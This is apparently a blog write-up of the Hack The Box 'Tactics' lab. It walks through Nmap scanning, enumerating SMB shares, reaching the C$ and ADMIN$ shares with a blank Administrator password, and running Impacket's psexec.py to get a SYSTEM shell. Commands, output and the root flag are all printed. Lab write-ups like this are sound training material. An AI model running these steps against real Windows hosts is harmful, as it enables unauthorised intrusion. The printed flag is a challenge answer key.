---
title: "[HTB] Tactics"
author: "Wook Lee"
date: "2024-07-26"
tags: ["Hack The Box"]
---

#### Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?

```
-Pn
```

By default, when nmap performs host discovery, it

- sends an ICMP ping.
- checks if port 80 is open
- checks if port 443 is open.

If any of these three conditions are met, nmap considers the host to be up.

However, in many real-world scenarios, ICMP is often blocked, and ports 80 and 443 are closed. In such cases, nmap may incorrectly assume the host is dead and not proceed with port scanning.

To address this issue, you can use the `-Pn` switch to skip the host discovery process.

<br>

#### What does the 3-letter acronym SMB stand for?

```
Server Message Block
```

<br>

#### What port does SMB use to operate at?

```
445
```

![alt text](image.png#center)

<br>

#### What command line argument do you give to `smbclient` to list available shares?

```
-L
```

![alt text](image-1.png#center)

<br>

#### What character at the end of a share name indicates it's an administrative share?

```
$
```

![alt text](image-2.png#center)

`$` indicates it's an administrative share.
`-U` switch for Login identity. **_Administrator_** is the high privilege standard account for Windows operating system.

<br>

#### Which Administrative share is accessible on the box that allows users to view the whole file system?

```
C$
```

![alt text](image-3.png#center)

<br>

#### What command can we use to download the files we find on the SMB Share?

```
get
```

```shell
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 03:16:03 2021
  ..                                 DR        0  Thu Apr 22 03:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 11:23:32 2021
  flag.txt                            A       32  Fri Apr 23 05:39:00 2021

                3774463 blocks of size 4096. 1158389 blocks available

smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

<br>

#### Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?

```
psexec.py
```

Since we can access this `ADMIN$` share, we can try to use a tool called `psexec.py` to exploit this misconfiguration & get the interactive system shell. The `psexec.py` is part of the Impacket framework.

**_Impacket_** is a framework written in Python for working with network protocols. It is focused on providing low-level programmatic access to the packets and for some protocols. In short, Impacket contains dozens of amazing tools for interacting with Windows systems and applications, many of which are ideal for attacking Windows and Active Directory.

One of the most commonly used tools in Impacket is `psexec.py`. It is named after the utility, PsExec from Microsoft's Sysinternals suite since it performs the same function of enabling us to execute a fully interactive shell on remote Windows machines.

**_How Impacket's psexec works_**
Impacket creates a remote service by uploading a randomly-named executable on the `ADMIN$` share on the remote system and then register it as a Windows service. This will result in having an interactive shell available on the remote Windows system via TCP port 445.

Psexec requires credentials for a user with local administrator privileges or higher since reading/writing to the `ADMIN$` share is required. Once you successfully authenticate, it will drop you int a `NT Authority\System` shell.

installation guide

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```

The syntax for simply getting an interactive shell from a target:

`python psexec.py username:password@hostIP`

We know that there is no password for the `Administrator` user. So, the command we are going to run is:

`psexec.py administrator@10.129.208.116`

![alt text](image-4.png#center)

```shell
C:\> whoami
nt authority\system
```

<br>

#### Submit root flag

```
f751c19eda8f61ce81827e6930a1f40c
```

```shell
┌──(kali㉿kali)-[~/Desktop/impacket]
└─$ psexec.py administrator@10.129.208.116
Impacket v0.12.0.dev1+20240725.125704.9f36a10e - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.208.116.....
[*] Found writable share ADMIN$
[*] Uploading file ckDQLGjh.exe
[*] Opening SVCManager on 10.129.208.116.....
[*] Creating service BjhK on 10.129.208.116.....
[*] Starting service BjhK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd \

C:\> dir *flag* /s
 Volume in drive C has no label.
 Volume Serial Number is EEE0-FCDB

 Directory of C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent

04/23/2021  02:38 AM               551 flag.lnk
               1 File(s)            551 bytes

 Directory of C:\Users\Administrator\Desktop

04/23/2021  02:39 AM                32 flag.txt
               1 File(s)             32 bytes

     Total Files Listed:
               2 File(s)            583 bytes
               0 Dir(s)   4,743,278,592 bytes free

C:\> type C:\Users\Administrator\Desktop\flag.txt
f751c19eda8f61ce81827e6930a1f40c
```

<br>

![alt text](image-5.png#center)
